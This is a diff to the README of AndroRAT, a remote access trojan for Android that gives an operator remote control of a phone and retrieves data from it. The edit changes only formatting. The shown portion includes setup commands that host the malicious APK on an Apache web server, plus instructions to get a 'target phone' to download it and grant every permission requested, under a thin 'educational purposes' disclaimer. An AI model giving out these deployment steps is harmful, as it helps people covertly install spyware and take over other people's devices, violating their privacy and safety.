@@ -1,9 +1,5 @@
 **Disclaimer** : This software is meant for educational purposes only. I'm not responsible for any malicious use of the app.
-# AndroRAT 
-
-[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 
-[![Twitter Follow](https://img.shields.io/twitter/follow/karma9874?label=Follow&style=social)](https://twitter.com/karma9874)
-[![GitHub followers](https://img.shields.io/github/followers/karma9874?label=Follow&style=social)](https://github.com/karma9874)
+# AndroRAT
 
 AndroRAT is a tool designed to give the control of the android system remotely and retrieve informations from it. Androrat is a client/server application developed in Java Android for the client side and the Server is in Python.
 
@@ -116,7 +112,7 @@ In the sh shell there are some sub commands
 
 
 ## Commands From Starting - Examples
-'''
+```
 git clone https://github.com/karma9874/AndroRAT.git
 cd AndroRAT
 pip install -r requirements.txt
@@ -131,4 +127,4 @@ sudo systemctl start apache2.service
 sudo cp <YOUR FILE NAME>.apk /var/www/html/
 
 OPEN YOUR TARGET PHONE AND ENTER THE IP ADDRESS IN WHICH YOU ARE RUNNING THE PROGRAM. THEN, DOWNLOAD IT AND ENTER OEPN IN YOUR TARGET PHONE AND GIVE ACCESS TO WHATEVER THE APP ASKS> THEN> GO TO THE 1ST TRMINAL AND TYPE help AND YOU ARE GOOF TOP GO!
-'''
+```
